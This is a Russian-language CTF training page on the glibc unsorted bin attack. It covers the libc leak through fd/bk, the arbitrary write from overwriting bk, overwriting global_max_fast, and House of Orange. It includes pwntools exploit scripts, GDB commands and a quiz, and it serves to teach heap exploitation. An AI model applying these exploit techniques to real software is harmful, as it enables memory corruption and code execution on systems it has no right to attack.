---
id: pwn-unsortedbin-attack
title: "Unsorted bin attack: классический примитив записи"
category: pwn
parent: pwn-heap-bin-attacks
difficulty: hard
order: 2
tags: [pwn, heap, glibc, unsortedbin, malloc]
prerequisites: [pwn-heap-basics, pwn-heap-uaf]
useful_for:
  - "CTF Pwn — heap-задачи"
  - "Разработка эксплойтов"
estimated_minutes: 55
summary: "Как удаление чанка из unsorted bin записывает адрес main_arena по контролируемому адресу и как использовать это для утечки и записи."
---
Unsorted bin attack — классический примитив, позволяющий записать адрес `main_arena` (адрес в libc) по произвольному адресу. Это не полный контроль над значением, но мощный строительный блок: он используется для перезаписи `global_max_fast`, для обхода проверок, для создания overlap и для последующей записи в `_IO_list_all` (в связке с House of Orange). Кроме того, чтение unsorted bin даёт утечку базы libc.

## Что такое unsorted bin

Unsorted bin — «карантин» между fastbins и small/large bins. Когда чанк освобождается и не попадает в tcache/fastbin, он кладётся в unsorted bin. При следующем `malloc` (не из fastbin) аллокатор проходит unsorted bin, сортирует чанки по нужным bins и, если находит точное совпадение, возвращает его. Чанк в unsorted bin имеет два указателя: `fd` и `bk`, оба указывающие на `main_arena` (если чанк единственный — на сам unsorted bin head).

## Структура и указатели

| Поле | Значение в unsorted bin |
|---|---|
| `fd` | `&unsorted_chunks(av)` = `main_arena + 0x60` |
| `bk` | `&unsorted_chunks(av)` |
| `size` | размер чанка + флаги |

`main_arena` — статическая структура в libc; её адрес фиксирован относительно базы. Поэтому чтение `fd`/`bk` свободного чанка даёт libc-адрес: `libc.address = leak - offset`. Это самый простой способ утечь libc.

## Утечка libc через unsorted bin

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)
p = process('./chall')
# 1) аллоцируем чанк больше tcache-диапазона (> 0x410) или заполняем tcache
alloc(0x500)
# 2) освобождаем -> попадает в unsorted bin
free(0)
# 3) читаем fd/bk через UAF/печать
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - 0x1ecbe0        # offset main_arena+0x60
log.success(f'libc @ {hex(libc.address)}')
```

Offset зависит от версии glibc: для 2.31 `main_arena+0x60` находится на `libc.symbols['__malloc_hook'] + 0x10` или вычисляется из известного символа. В GDB можно получить точный offset: `p &main_arena + 0x60 - libc_base`.

## Unsorted bin attack: запись адреса

Идея атаки: при сортировке unsorted bin `malloc` выполняет `bck = victim->bk; bck->fd = unsorted_chunks(av)`. Если перезаписать `victim->bk` на `target - 0x10`, то по адресу `target` (точнее `bck->fd`, где `bck = target - 0x10`) запишется адрес `main_arena + 0x60`. То есть мы записываем libc-адрес по произвольному адресу.

```c
// схема в malloc:
victim = unsorted_chunks(av)->bk;
bck = victim->bk;
bck->fd = unsorted_chunks(av);   // ЗАПИСЬ по bck+0x10
```

```python
# 1) создать чанк в unsorted bin
alloc(0x500); free(0)
# 2) перезаписать victim->bk (через UAF)
edit(0, p64(0) + p64(target - 0x10))
# 3) вызвать malloc -> сработает запись
alloc(0x500)
```

## Применение: global_max_fast

Самое известное применение — перезапись `global_max_fast` (переменная в libc, задающая максимальный размер fastbin). Записав туда большое значение (адрес `main_arena+0x60` обычно больше 0x80), мы расширяем диапазон fastbin, что позволяет освобождать большие чанки в fastbin и применять fastbin dup к ним. Это открывает путь к дальнейшим атакам.

```python
target = libc.symbols['global_max_fast']
```

## Применение: House of Orange

Связка unsorted bin attack + FSOP. Записываем адрес `main_arena` в `_IO_list_all`, подделываем `_IO_FILE` так, чтобы при выходе/флаше сработала цепочка, приводящая к `system`. Подробнее — в `pwn-io-stdout` и `pwn-fsop`.

## Полный эксплойт

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # 1) утечка libc через unsorted bin
    alloc(0x500); free(0)
    edit(0, b'A'*8)
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ecbe0
    # 2) unsorted bin attack -> global_max_fast
    alloc(0x500); free(1)
    edit(1, p64(0) + p64(libc.symbols['global_max_fast'] - 0x10))
    alloc(0x500)                        # запись main_arena в global_max_fast
    log.success('global_max_fast overwritten')
    p.interactive()

exploit()
```

## Тонкости и подводные камни

- **Offset main_arena зависит от версии.** Уточняйте в GDB.
- **Чанк должен быть единственным в unsorted bin** для корректного `fd`/`bk`.
- **Проверки glibc 2.29+.** Добавлены проверки целостности unsorted bin (`bck->fd == victim`), что ломает часть атак.
- **`target - 0x10`.** Запись идёт по `bck->fd`, то есть `bk + 0x10`.
- **Размер чанка.** Должен быть > tcache-диапазона (или tcache заполнен).
- **Выравнивание target.** Проверяйте, что запись не портит критичные данные.
- **Состояние после атаки.** `malloc` может упасть из-за испорченных указателей — планируйте цепочку.

## Справочные таблицы

| Величина | Значение |
|---|---|
| `main_arena` | символ в libc |
| `unsorted_chunks(av)` | `main_arena + 0x60` |
| `global_max_fast` | символ в libc |
| `_IO_list_all` | символ в libc |

| Атака | Цель записи |
|---|---|
| unsorted bin attack | `global_max_fast`, `_IO_list_all` |
| House of Orange | `_IO_list_all` + FSOP |
| largebin attack | произвольная запись |

## Что дальше / решение

Дальше: `pwn-house-of-force`, `pwn-io-stdout` (House of Orange), `pwn-largebin-attack`, `pwn-fsop`. Практический алгоритм: (1) получите чанк в unsorted bin; (2) прочитайте `fd`/`bk` — это утечка libc; (3) перезапишите `bk` на `target - 0x10`; (4) вызовите `malloc`, чтобы сработала запись; (5) используйте записанный адрес в следующей атаке. Unsorted bin attack — это примитив записи адреса, который открывает дорогу к более сложным техникам.

## Подробный разбор сортировки unsorted bin

Чтобы понять атаку, проследим, что делает `malloc` при обходе unsorted bin. Алгоритм `_int_malloc` для запроса не из fastbin: берёт `victim = unsorted_chunks(av)->bk` (последний чанк). Если размер `victim` точно совпадает с запросом — возвращает его. Иначе, если `victim` — единственный чанк в unsorted bin, он перемещается в `last_remainder` и из него вырезается нужный размер. Иначе `victim` сортируется в соответствующий small/large bin: при этом выполняются операции `bck = victim->bk; unsorted_chunks(av)->bk = bck; bck->fd = unsorted_chunks(av)`.

Именно строка `bck->fd = unsorted_chunks(av)` и есть запись. Если `bck` (то есть `victim->bk`) подконтролен, запись идёт по адресу `bck + 0x10`. Значение, которое записывается, — адрес `unsorted_chunks(av)` = `main_arena + 0x60` (libc-адрес). Так мы получаем запись libc-указателя по произвольному адресу.

## Как в GDB увидеть main_arena и offset

```bash
gdb ./chall
(gdb) b malloc
(gdb) run
(gdb) p/x &main_arena
(gdb) p/x &main_arena + 0x60
(gdb) p/x (char*)&main_arena + 0x60 - (char*)&_IO_2_1_stdin_
```

Последняя команда даёт offset `unsorted_chunks` относительно известного символа libc. В эксплойте offset вычисляется как `libc.symbols['main_arena'] + 0x60 - libc.address` (символ `main_arena` может быть не экспортирован — тогда используйте `__malloc_hook + 0x10` в старых glibc).

## Проверки glibc 2.29+

Начиная с glibc 2.29, при сортировке unsorted bin добавлены проверки: `if (__glibc_unlikely(bck->fd != victim)) malloc_printerr("corrupted unsorted chunks")`. Это означает, что перед записью `bck->fd` glibc проверяет, что по адресу `bck->fd` уже лежит `victim`. Для атаки нужно, чтобы по адресу `target` изначально лежал указатель на `victim` — либо использовать технику, обходящую проверку (например, запись в место, где значение уже совпадает). В новых версиях unsorted bin attack стала заметно сложнее, и её часто заменяют largebin attack.

## Largebin attack как замена

Largebin attack использует `fd_nextsize`/`bk_nextsize` больших чанков. При вставке чанка в largebin glibc выполняет запись по указателям `nextsize`, которые можно подделать. Это даёт произвольную запись в glibc 2.29+ и используется в современных задачах. Подробнее — в `pwn-largebin-attack`.

## Расширенный пример: House of Orange

House of Orange — комбинация off-by-one (для получения unsorted bin) и FSOP. Схема: (1) через off-by-one освободить top chunk, получив чанк в unsorted bin; (2) утечь libc; (3) записать адрес `main_arena` в `_IO_list_all` через unsorted bin attack; (4) подделать `_IO_FILE` так, чтобы цепочка `_IO_flush_all_lockp` вызвала `system('/bin/sh')`. Это классическая задача для старых glibc и отличная тренировка понимания и unsorted bin, и FSOP.

```python
# 1) off-by-one освобождает top -> чанк в unsorted bin
# 2) leak libc
# 3) unsorted bin attack: target = _IO_list_all
# 4) fake _IO_FILE в куче с vtable -> system
```

## Итог

Unsorted bin attack — это примитив записи libc-адреса по произвольному адресу. Он даёт утечку libc и используется для перезаписи `global_max_fast` и `_IO_list_all`. На старых glibc это простой и мощный инструмент; на новых проверки усложняют его, но понимание механики необходимо для перехода к largebin attack и FSOP. Изучите его вместе с House of Orange — это классическая пара.

## Заключительные замечания

Unsorted bin — это и источник утечки libc, и площадка для записи адреса. Даже если на вашей версии glibc классическая атака не проходит из-за проверок, умение прочитать `fd`/`bk` свободного чанка и понять механику сортировки необходимо для любой heap-задачи. Начните с утечки, затем попробуйте запись в `global_max_fast` на старой glibc.

Практикуйте эту технику на учебных бинарях старой glibc, а затем переходите к largebin attack — она продолжает идею записи в современных условиях.

## Квиз

```quiz
- question: "Что записывает unsorted bin attack?"
  options:
    - "Адрес main_arena (libc) по контролируемому адресу"
    - "Ноль в canary"
    - "Указатель на стек"
    - "Содержимое GOT"
  answer: 0
  explanation: "При удалении чанка из unsorted bin bck->fd = &main_arena.bins[0]."
- question: "Какое поле чанка нужно подделать?"
  options:
    - "bk (указатель назад)"
    - "prev_size"
    - "size"
    - "fd_nextsize"
  answer: 0
  explanation: "victim->bk определяет, куда пойдёт запись (bck = victim->bk)."
- question: "Какая проверка усложнила unsorted attack с glibc 2.29?"
  options:
    - "bck->fd == victim в unlink_chunk"
    - "safe-linking"
    - "tcache key"
    - "PTR_MANGLE"
  answer: 0
  explanation: "Проверка консистентности ломает наивную подделку bk."
- question: "Какой типичный объект перезаписывают через unsorted attack?"
  options:
    - "global_max_fast"
    - "canary"
    - "GOT"
    - "vtable"
  answer: 0
  explanation: "Запись большого адреса по global_max_fast расширяет fastbin на все размеры."
- question: "Почему нужен guard-чанк?"
  options:
    - "Чтобы освобождённый чанк не консолидировался с top"
    - "Чтобы включить ASLR"
    - "Чтобы снять canary"
    - "Чтобы расширить GOT"
  answer: 0
  explanation: "Guard предотвращает слияние с top и сохраняет чанк в unsorted bin."
```

## Где пригодится

- **CTF:** Pwn — heap-задачи с unsorted bin.
- **Bug bounty:** понимание glibc-примитивов.
- **Пентест:** эксплуатация heap-багов.
- **Работа:** security research glibc.
